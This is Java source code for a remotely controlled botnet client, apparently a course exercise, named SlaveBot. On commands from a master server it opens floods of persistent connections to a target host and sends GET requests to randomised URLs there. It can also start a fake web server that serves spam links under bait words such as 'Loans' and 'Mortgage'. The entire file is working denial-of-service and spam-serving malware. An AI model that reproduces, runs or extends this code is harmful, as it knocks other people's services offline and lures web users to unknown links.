import java.io.*;
import java.net.*;
import java.util.*;
import java.text.*;


class slaveSocketDetails{
Socket 	targetSocket;
String 	regDate;
String 	targetHostIP;
String 	targetAddressName;
int	    targetPortNumber;

 slaveSocketDetails() {
	Date currDate = new Date();
	regDate= new SimpleDateFormat("yyyy-MM-dd").format(currDate);
  }
}

class SocketConnection extends Thread{
    
    Socket clientsocket;
    PrintWriter out;
    String linkurl;
    
    public SocketConnection(Socket clientsoc, String url){
        try{
            clientsocket=clientsoc;
            out = new PrintWriter(clientsocket.getOutputStream());
            linkurl=url;
        }
        catch (Exception e) {
            System.out.println("Error: " + e);
            return;
        }
    }
        
    public void run(){
        try{
            
            String top_words = "<html>\r\n"+
                                    "<body>\r\n"+
                                        "<ul>\r\n" +
                                            "<li>Insurance</li>\r\n" +
                                            "<li>Loans</li>\r\n" +
                                            "<li>Mortgage</li>\r\n" +
                                            "<li>Attorney</li>\r\n" +
                                            "<li>Credit</li>\r\n" +
                                            "<li>Lawyer</li>\r\n" +
                                            "<li>Donate</li>\r\n" +
                                            "<li>Degree</li>\r\n" +
                                            "<li>Hosting</li>\r\n" +
                                            "<li>Cliam</li>\r\n" +
                                        "</ul>\r\n" +
                                    "</body>\r\n" +
                                "</html>\r\n" ;                                                                
            out.println("HTTP/1.0 200 OK");
            out.println("Content-Type: text/html");
            out.println("Server: Bot");
            // this blank line signals the end of the headers
            out.println("");
            // Send the HTML page
            out.println("<H1>Breaking News</H1>");
            out.println("<a href=\"" + linkurl +"\">Link 1</a>");
            out.println("<a href=\"" + linkurl +"\">Link 2</a>");
            out.println("<p> For latest information on the below topics click the links below");
            out.println(top_words);
            out.println("\r\n");
            out.println("<a href=\"http://" + linkurl +"\">Check this out!</a>");
            out.println("<a href=\"http://" + linkurl +"\">Check this out!</a>");
            out.println("<a href=\"http://" + linkurl +"\">Check this out!</a>");
            out.println("<a href=\"http://" + linkurl +"\">Check this out!</a>");
            out.println("<a href=\"http://" + linkurl +"\">Check this out!</a>");
            out.println("<a href=\"http://" + linkurl +"\">Check this out!</a>");
            out.println("<a href=\"http://" + linkurl +"\">Check this out!</a>");
            out.println("<a href=\"http://" + linkurl +"\">Check this out!</a>");
            out.println("<a href=\"http://" + linkurl +"\">Check this out!</a>");
            out.println("<a href=\"http://" + linkurl +"\">Check this out!</a>");
            out.flush(); 
            out.close();
            clientsocket.close();
        }
        catch (Exception e) {
            System.out.println("Error: " + e);
        }
    }
}


public class SlaveBot {
    public static boolean isPortAvailable(int port) {
        Socket testsocket = null;
        try {
            testsocket = new Socket("localhost", port);
            return false;
        } 
        catch (IOException e) {
            return true;
        } 
        finally {
            if( testsocket != null){
                try {
                    testsocket.close();
                } catch (IOException e) {
                    throw new RuntimeException("You should handle this error." , e);
                }
            }
        }
    }
    public static ArrayList<slaveSocketDetails> slaveconnList=new ArrayList<slaveSocketDetails>();
    public static Socket slaveSocket;
    public static void main(String[] args) throws Exception {
        if (args.length<4){
            System.out.println("Error in the arguments provided");
            System.exit(-1);	
        }
        String hostname = "";
        String portno = "";
        ServerSocket serversoc=null;
        boolean acceptrequest=true;
        if (args[0].equals("-h") && args[2].equals("-p")){ 
            hostname=args[1];
            portno=args[3];
        }
        else if (args[0].equals("-p") && args[2].equals("-h")){ 
            hostname=args[3];
            portno=args[1];
        }
        else{
            System.out.println("Hostname and Port number should be provided with args -h and -p respectively");
            System.exit(-1);
        }
        try{
            Integer.parseInt(portno);
        }
        catch (Exception e){
           System.out.println("Port number provided is Invalid");
           System.exit(-1);
        }
        slaveSocket = new Socket(hostname, Integer.parseInt(portno));
        BufferedReader netIn = new BufferedReader(new InputStreamReader(slaveSocket.getInputStream()));
        slaveSocketDetails slaveTargetList;
        while (true) {
            try{
                String commandFromServer = netIn.readLine();
                if (commandFromServer !="") {
                    String[] serverCommand = commandFromServer.split(" ");
                    if(serverCommand[0].equals("connect")){
                        String targethostname = serverCommand[1];
                        int targetport = Integer.parseInt(serverCommand[2].toString());
                        int noofconn = Integer.parseInt(serverCommand[3].toString());
                        Socket slavetargetSocket;
                        if(serverCommand[5].equals("none")){    	
                            for (int i=0; i< noofconn; i++){
                                try{	
                                    //System.out.println("Entered to Url=none block");
                                    slavetargetSocket = new Socket(targethostname, targetport);
                                    slaveTargetList=new slaveSocketDetails();
                                    slaveTargetList.targetHostIP=slavetargetSocket.getInetAddress().getHostAddress();
                                    slaveTargetList.targetAddressName=slavetargetSocket.getInetAddress().getHostName();
                                    slaveTargetList.targetPortNumber=targetport;
                                    slaveTargetList.targetSocket=slavetargetSocket;
                                    slaveconnList.add(slaveTargetList);
                                    if(serverCommand[4].equals("keepalive")){
                                        //System.out.println("Entered to keepalive block");
                                        slavetargetSocket.setKeepAlive(true);
                                    }
                                }
                                catch (Exception e) {
                                    System.out.println(" could not open connection for  " + targethostname+" " + targetport);
                                }
                            }
                        }
                        else if (serverCommand[5].contains("url=")){
                            for (int i=0; i< noofconn; i++){
                                try{	
                                    //System.out.println("Entered to Url valid block");
                                    slavetargetSocket = new Socket(targethostname, targetport);
                                    slaveTargetList=new slaveSocketDetails();
                                    slaveTargetList.targetHostIP=slavetargetSocket.getInetAddress().getHostAddress();
                                    slaveTargetList.targetAddressName=slavetargetSocket.getInetAddress().getHostName();
                                    slaveTargetList.targetPortNumber=targetport;
                                    slaveTargetList.targetSocket=slavetargetSocket;
                                    slaveconnList.add(slaveTargetList);
                                    if(serverCommand[4].equals("keepalive")){
                                        //System.out.println("Entered to keepalive block");
                                        slavetargetSocket.setKeepAlive(true);
                                    }
                                    Random rand = new Random();
                                    int strlen = rand.nextInt(10)+1;
                                    String randstr="";
                                    for(int j= 0; j<strlen; j++)
                                    {
                                        int randno = rand.nextInt(26)+97;
                                        randstr += Character.toString((char)(int)randno);
                                    }
                                    //System.out.println(" executed till here ");
                                    String url = "https://"+targethostname+serverCommand[5].substring(4)+randstr;
                                    //System.out.println(url);
									URL url_gen = new URL(url);
                                    HttpURLConnection httpUrlConnect = (HttpURLConnection) url_gen.openConnection();
									httpUrlConnect.setRequestMethod("GET");
									httpUrlConnect.connect();
									int urlMessage = httpUrlConnect.getResponseCode();
									BufferedReader in = new BufferedReader(new InputStreamReader(httpUrlConnect.getInputStream()));
                                    String inputLine;
                                    StringBuffer response = new StringBuffer();
                                    while ((inputLine = in.readLine()) != null) {
                                        response.append(inputLine);
                                    }
                                    in.close();
                                }
                                catch (Exception e) {
                                    System.out.println(" could not open connection for  " + targethostname+" " + targetport);
                                }
                            }
                        }
                    }
                    else if (serverCommand[0].equals("disconnect")){
                        String targetname = serverCommand[1];
                        int targetportno =Integer.parseInt(serverCommand[2].toString());
                        Iterator<slaveSocketDetails> i = slaveconnList.iterator();
                        while (i.hasNext()) {
                            slaveSocketDetails delSocket =i.next();
                            if(delSocket.targetHostIP.equals(targetname) || delSocket.targetAddressName.equals(targetname)){
                                if(targetportno==0 || delSocket.targetPortNumber==targetportno ){
                                    delSocket.targetSocket.close();
                                    i.remove();
                                }
                            }
                        }
                    }
                    else if (serverCommand[0].equals("risefakeurl")){
                        //System.out.println("In Here");
                        int webportno=Integer.parseInt(serverCommand[1].toString());
                        String url=serverCommand[2];
                        
                        if(!isPortAvailable(webportno)){
                            webportno=webportno+1;
                            //System.out.println("In Here: " );
                        }
                        
                        try {
                          // create the main server socket
                          serversoc = new ServerSocket(webportno);
                             //System.out.println("Connected on  Here: " + webportno);
                        } 
                        catch (Exception e) {
                          System.out.println("Error: " + e);
                          return;
                        }
                        while(true){
                            try{
                                Socket client=serversoc.accept();
                                if(acceptrequest==true)
                                {
                                    SocketConnection sc= new SocketConnection(client,url);
                                    sc.start();
                                }
                            } 
                            catch (Exception e) {
                                System.out.println("Error: " + e);
                            }
                        }
                    }
                    
                    else if (serverCommand[0].equals("downfakeurl")){
                        //System.out.println("In Here");
                        int webportno=Integer.parseInt(serverCommand[1].toString());
                        String url=serverCommand[2];
                        acceptrequest=false;
                        try {
                          // create the main server socket
                          serversoc = new ServerSocket(webportno);
                              // System.out.println("Success Exp");
                        } 
                        catch (IOException e) {
                             //System.out.println("In Exp");
                            if (serversoc != null && !serversoc.isClosed()) {
                                try {
                                    serversoc.close();
                                } 
                                catch (IOException exp)
                                {
                                    exp.printStackTrace(System.err);
                                }
                            }
                        }
                    }
                }
                else{
                 System.out.println(" not a proper command " +  commandFromServer);
                }
            }
            catch (Exception e) {
                e.printStackTrace();
                System.exit(-1);	   
            }
        }
    }
}